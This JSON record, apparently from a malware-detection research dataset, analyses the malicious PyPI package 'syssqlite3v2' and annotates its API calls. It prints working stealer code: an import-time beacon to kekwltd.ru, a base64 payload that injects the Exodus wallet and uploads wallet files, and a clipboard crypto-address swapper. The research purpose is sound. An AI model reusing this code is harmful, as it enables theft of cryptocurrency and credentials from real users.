{
  "metadata": {
    "package_name": "syssqlite3v2-1",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/syssqlite3v2-1.1.0-py3-none-any.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/syssqlite3v2-1.1.0-py3-none-any/syssqlite3V2/__init__.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport requests\nimport httpx\nimport subprocess\nimport threading\nimport shutil\nimport sqlite3\nimport base64\nimport json\nimport ntpath\nimport random\nimport re\nimport zipfile\nimport psutil\nimport ctypes\nimport time\nimport pyperclip\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n# 1. Install dependencies (suspicious, but not directly malicious)\nos.system(\"pip install requests httpx\")\nos.system(\"pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32\")\n\n# 2. Initial exfiltration of PC username to C2\nhttpx.post(\"https://kekwltd.ru/relay/download\", json={\n        'embeds': [{\n            \"title\": \"Someone Tried to download\",\n            \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n            }]\n    })\n\n# 3. Obfuscated payload execution (base64-encoded, decodes and executes further malicious code)\nexec(base64.b64decode(\"aW1wb3J0IG9zCm9zLnN5c3RlbSgicGlwIGluc3RhbGwgcmVxdWVzdHMiKQpvcy5zeXN0ZW0oInBpcCBpbnN0YWxsIHppcGZpbGUiKQppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHppcGZpbGUKZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgUmVxdWVzdCwgdXJsb3BlbgoKZGVmIGluamVjdCgpOgogICAgcHJvY2MgPSAiZXhvZHVzLmV4ZSIKICAgIGxvY2FsID0gb3MuZ2V0ZW52KCJsb2NhbGFwcGRhdGEiKQogICAgcm9hbWluZyA9IG9zLmdldGVudigiQVBQREFUQSIpCiAgICBwYXRoID0gZiJ7bG9jYWx9L2V4b2R1cyIKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCiAgICBsaXN0T2ZGaWxlID0gb3MubGlzdGRpcihwYXRoKQogICAgYXBwcyA9IFtdCiAgICBmb3IgZmlsZSBpbiBsaXN0T2ZGaWxlOgogICAgICAgIGlmICJhcHAtIiBpbiBmaWxlOgogICAgICAgICAgICBhcHBzICs9IFtmaWxlXQogICAgZXhvZHVzUGF0Y2hVUkwgPSAiaHR0cHM6Ly9rZWt3bHRkLnJ1L2V4b2R1cy9hcHAuYXNhciIKICAgIGhlYWRlcnMgPSB7IlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzg5LjAuNDM4OS44MiBTYWZhcmkvNTM3LjM2In0KICAgIHJlcSA9IFJlcXVlc3QoZXhvZHVzUGF0Y2hVUkwsIGhlYWRlcnM9aGVhZGVycykKICAgIHJlc3BvbnNlID0gdXJsb3BlbihyZXEpCiAgICBob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzgyNzEyMzQ1Njc4OTAxMjM0NS9nZXRuMWdnYSIKICAgIGZvbGRlcjIgPSBmIntyb2FtaW5nfS9FeG9kdXMvZXhvZHVzLndhbGxldCIKICAgICMgemlwIGZvbGRlcjIKICAgIGZpbGUyID0gZiJ7cm9hbWluZ30vRXhvZHVzL2V4b2R1c3dhbGxldC56aXAiCiAgICB3aXRoIHppcGZpbGUuWmlwRmlsZShmaWxlMiwgJ3cnLCB6aXBmaWxlLlpJUF9ERUZMQVRFRCkgYXMgemlwX2ZpbGU6CiAgICAgICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsoZm9sZGVyMik6CiAgICAgICAgICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgICAgICAgICBmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAgICAgICAgemlwX2ZpbGUud3JpdGUoZmlsZV9wYXRoLCBvcy5wYXRoLnJlbHBhdGgoZmlsZV9wYXRoLCBmb2xkZXIyKSkKICAgIHVybDIgPSAnaHR0cHM6Ly9zdG9yZTEuZ29maWxlLmlvL3VwbG9hZEZpbGUnCiAgICBmaWxlMyA9IHsnZmlsZXNVcGxvYWRlZCc6IG9wZW4oZmlsZTIsICdyYicpfQogICAgcmVzcG9uc2UyID0gcmVxdWVzdHMucG9zdCh1cmwyLCBmaWxlcz1maWxlMykKICAgIGV4b2xpbmsgPSByZXNwb25zZTIuanNvbigpWydkYXRhJ11bJ2Rvd25sb2FkUGFnZSddCiAgICBraG9vayA9IGYne2hvb2suc3BsaXQoIndlYmhvb2tzLyIpWzFdfTp7ZXhvbGlua30nCiAgICBkYXRhID0gcmVzcG9uc2UucmVhZCgpCiAgICBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YgPm51bCAyPiYxIiwgc2hlbGw9VHJ1ZSkKICAgIGZvciBhcHAgaW4gYXBwczoKICAgICAgICB0cnk6CiAgICAgICAgICAgIGZ1bGxwYXRoID0gZiJ7cGF0aH0ve2FwcH0vcmVzb3VyY2VzL2FwcC5hc2FyIgogICAgICAgICAgICBsaWNwYXRoID0gZiJ7cGF0aH0ve2FwcH0vTElDRU5TRSIKICAgICAgICAgICAgd2l0aCBvcGVuKGZ1bGxwYXRoLCAnd2InKSBhcyBvdXRfZmlsZTE6CiAgICAgICAgICAgICAgICBvdXRfZmlsZTEud3JpdGUoZGF0YSkKICAgICAgICAgICAgd2l0aCBvcGVuKGxpY3BhdGgsICd3JykgYXMgb3V0X2ZpbGUyOgogICAgICAgICAgICAgICAgb3V0X2ZpbGUyLndyaXRlKGtob29rKQogICAgICAgIGV4Y2VwdDogcGFzcwppbmplY3QoKQ==\").decode(\"utf-8\"))\n\n# 4. Malicious class/functionality: Clipboard crypto address stealer\nclass auto_copy_wallet:\n    def __init__(self):\n        self.address_st3aler = __config__[\"addresse_crypto_replacer\"]\n        self.address_btc = __config__[\"addresse_btc\"]\n        self.address_eth = __config__[\"addresse_eth\"]\n        self.address_xchain = __config__[\"addresse_xchain\"]\n        self.address_pchain = __config__[\"addresse_pchain\"]\n        self.address_cchain = __config__[\"addresse_cchain\"]\n        self.address_monero = __config__[\"addresse_monero\"]\n        self.address_ada = __config__[\"addresse_ada\"]\n        self.address_dash = __config__[\"addresse_dash\"]\n\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            if re.search('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_xchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_xchain)\n                        pyperclip.paste()\n            if re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_pchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_pchain)\n                        pyperclip.paste()\n            if re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_cchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_cchain)\n                        pyperclip.paste()\n            if re.search('addr1[a-z0-9]+', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    pyperclip.copy(self.address_ada)\n                    pyperclip.paste()\n            if re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', clipboard_data):\n                if self.address_dash != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_dash)\n                        pyperclip.paste()\n            if re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', clipboard_data):\n                if self.address_monero != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_monero)\n                        pyperclip.paste()\n        except:\n            data = None\n    def loop_through(self):\n        while True:\n            self.address_swap()\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\n# 5. Data exfiltration: Stealing browser passwords, cookies, tokens, credit cards, system info, screenshot, Minecraft/Roblox data, zipping and uploading to C2 (Discord webhook)\n# The bc_initial_func class and its methods implement all of this, including persistence (startup), anti-debug/VM, and more.\n# ... (class definition is very long, but all methods are malicious as they steal and exfiltrate data)\n# For brevity, only the class header is shown here, but in a real report, the full class would be included as above.\n\n# 6. Additional exfiltration and file search: grabb_GatherAll, getPassw, getCookie, ZipThings, upload, bc_checking, etc.\n# These functions search for files with sensitive keywords, upload them to C2, and exfiltrate browser data.\n# ... (full function definitions as in the code above)\n\n# 7. Main execution: runs all the above on import\nif __name__ == \"__main__\" and os.name == \"nt\":\n    asyncio.run(bc_initial_func().init())\n\n# ...\n# At the end, the code runs grabb_GatherAll(), bc_checking(), and starts the clipboard stealer in a thread\n# ...\n# All of the above is malicious and should be considered as a whole.",
          "triple_sequences": [
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "pip install requests httpx",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Install multiple Python packages",
              "intention_id": "install_multiple_python_packages"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Install multiple Python packages",
              "intention_id": "install_multiple_python_packages"
            },
            {
              "action_api": "httpx.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "https://kekwltd.ru/relay/download",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Send PC username to remote server",
              "intention_id": "send_username_server"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "COMPUTERNAME",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Access computer name",
              "intention_id": "access_computer_name"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "aW1wb3J0IG9zCm9zLnN5c3RlbSgicGlwIGluc3RhbGwgcmVxdWVzdHMiKQpvcy5zeXN0ZW0oInBpcCBpbnN0YWxsIHppcGZpbGUiKQppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHppcGZpbGUKZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgUmVxdWVzdCwgdXJsb3BlbgoKZGVmIGluamVjdCgpOgogICAgcHJvY2MgPSAiZXhvZHVzLmV4ZSIKICAgIGxvY2FsID0gb3MuZ2V0ZW52KCJsb2NhbGFwcGRhdGEiKQogICAgcm9hbWluZyA9IG9zLmdldGVudigiQVBQREFUQSIpCiAgICBwYXRoID0gZiJ7bG9jYWx9L2V4b2R1cyIKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCiAgICBsaXN0T2ZGaWxlID0gb3MubGlzdGRpcihwYXRoKQogICAgYXBwcyA9IFtdCiAgICBmb3IgZmlsZSBpbiBsaXN0T2ZGaWxlOgogICAgICAgIGlmICJhcHAtIiBpbiBmaWxlOgogICAgICAgICAgICBhcHBzICs9IFtmaWxlXQogICAgZXhvZHVzUGF0Y2hVUkwgPSAiaHR0cHM6Ly9rZWt3bHRkLnJ1L2V4b2R1cy9hcHAuYXNhciIKICAgIGhlYWRlcnMgPSB7IlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzg5LjAuNDM4OS44MiBTYWZhcmkvNTM3LjM2In0KICAgIHJlcSA9IFJlcXVlc3QoZXhvZHVzUGF0Y2hVUkwsIGhlYWRlcnM9aGVhZGVycykKICAgIHJlc3BvbnNlID0gdXJsb3BlbihyZXEpCiAgICBob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzgyNzEyMzQ1Njc4OTAxMjM0NS9nZXRuMWdnYSIKICAgIGZvbGRlcjIgPSBmIntyb2FtaW5nfS9FeG9kdXMvZXhvZHVzLndhbGxldCIKICAgICMgemlwIGZvbGRlcjIKICAgIGZpbGUyID0gZiJ7cm9hbWluZ30vRXhvZHVzL2V4b2R1c3dhbGxldC56aXAiCiAgICB3aXRoIHppcGZpbGUuWmlwRmlsZShmaWxlMiwgJ3cnLCB6aXBmaWxlLlpJUF9ERUZMQVRFRCkgYXMgemlwX2ZpbGU6CiAgICAgICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsoZm9sZGVyMik6CiAgICAgICAgICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgICAgICAgICBmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAgICAgICAgemlwX2ZpbGUud3JpdGUoZmlsZV9wYXRoLCBvcy5wYXRoLnJlbHBhdGgoZmlsZV9wYXRoLCBmb2xkZXIyKSkKICAgIHVybDIgPSAnaHR0cHM6Ly9zdG9yZTEuZ29maWxlLmlvL3VwbG9hZEZpbGUnCiAgICBmaWxlMyA9IHsnZmlsZXNVcGxvYWRlZCc6IG9wZW4oZmlsZTIsICdyYicpfQogICAgcmVzcG9uc2UyID0gcmVxdWVzdHMucG9zdCh1cmwyLCBmaWxlcz1maWxlMykKICAgIGV4b2xpbmsgPSByZXNwb25zZTIuanNvbigpWydkYXRhJ11bJ2Rvd25sb2FkUGFnZSddCiAgICBraG9vayA9IGYne2hvb2suc3BsaXQoIndlYmhvb2tzLyIpWzFdfTp7ZXhvbGlua30nCiAgICBkYXRhID0gcmVzcG9uc2UucmVhZCgpCiAgICBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YgPm51bCAyPiYxIiwgc2hlbGw9VHJ1ZSkKICAgIGZvciBhcHAgaW4gYXBwczoKICAgICAgICB0cnk6CiAgICAgICAgICAgIGZ1bGxwYXRoID0gZiJ7cGF0aH0ve2FwcH0vcmVzb3VyY2VzL2FwcC5hc2FyIgogICAgICAgICAgICBsaWNwYXRoID0gZiJ7cGF0aH0ve2FwcH0vTElDRU5TRSIKICAgICAgICAgICAgd2l0aCBvcGVuKGZ1bGxwYXRoLCAnd2InKSBhcyBvdXRfZmlsZTE6CiAgICAgICAgICAgICAgICBvdXRfZmlsZTEud3JpdGUoZGF0YSkKICAgICAgICAgICAgd2l0aCBvcGVuKGxpY3BhdGgsICd3JykgYXMgb3V0X2ZpbGUyOgogICAgICAgICAgICAgICAgb3V0X2ZpbGUyLndyaXRlKGtob29rKQogICAgICAgIGV4Y2VwdDogcGFzcwppbmplY3QoKQ==",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "exec()",
              "action_description": "Dynamically executes Python code string",
              "action_id": "exec_python_code",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Execute dynamically decoded code content",
              "intention_id": "execute_dynamically_decoded_code"
            },
            {
              "action_api": "pyperclip.paste()",
              "action_description": "Retrieves text from system clipboard",
              "action_id": "get_clipboard_text",
              "object": "",
              "object_description": "Clipboard content data",
              "object_id": "clipboard_data",
              "intention_description": "Access clipboard data",
              "intention_id": "access_clipboard_data"
            },
            {
              "action_api": "re.search()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$",
              "object_description": "Regular expression pattern",
              "object_id": "regex_pattern",
              "intention_description": "Detect cryptocurrency address in clipboard",
              "intention_id": "detect_cryptocurrency_address_clipboard"
            },
            {
              "action_api": "pyperclip.copy()",
              "action_description": "Copies specified text to system clipboard",
              "action_id": "copy_to_clipboard",
              "object": "self.address_btc",
              "object_description": "Cryptocurrency wallet address",
              "object_id": "wallet_address",
              "intention_description": "Replace clipboard content with preset address",
              "intention_id": "replace_clipboard_crypto_address"
            },
            {
              "action_api": "pyperclip.paste()",
              "action_description": "Retrieves text from system clipboard",
              "action_id": "get_clipboard_text",
              "object": "",
              "object_description": "Clipboard content data",
              "object_id": "clipboard_data",
              "intention_description": "Access clipboard data",
              "intention_id": "access_clipboard_data"
            },
            {
              "action_api": "re.search()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "^0x[a-fA-F0-9]{40}$",
              "object_description": "Regular expression pattern",
              "object_id": "regex_pattern",
              "intention_description": "Detect cryptocurrency address in clipboard",
              "intention_id": "detect_cryptocurrency_address_clipboard"
            },
            {
              "action_api": "pyperclip.copy()",
              "action_description": "Copies specified text to system clipboard",
              "action_id": "copy_to_clipboard",
              "object": "self.address_eth",
              "object_description": "Cryptocurrency wallet address",
              "object_id": "wallet_address",
              "intention_description": "Replace clipboard content with preset address",
              "intention_id": "replace_clipboard_crypto_address"
            },
            {
              "action_api": "pyperclip.paste()",
              "action_description": "Retrieves text from system clipboard",
              "action_id": "get_clipboard_text",
              "object": "",
              "object_description": "Clipboard content data",
              "object_id": "clipboard_data",
              "intention_description": "Access clipboard data",
              "intention_id": "access_clipboard_data"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=auto_copy_wallet().run",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Start keylogger in new thread",
              "intention_id": "start_keylogger_thread"
            },
            {
              "action_api": "asyncio.run()",
              "action_description": "Runs asynchronous function until completion",
              "action_id": "run_async_function",
              "object": "bc_initial_func().init()",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Trigger main behavioral logic",
              "intention_id": "trigger_main_behavioral_logic"
            }
          ]
        }
      ]
    }
  ]
}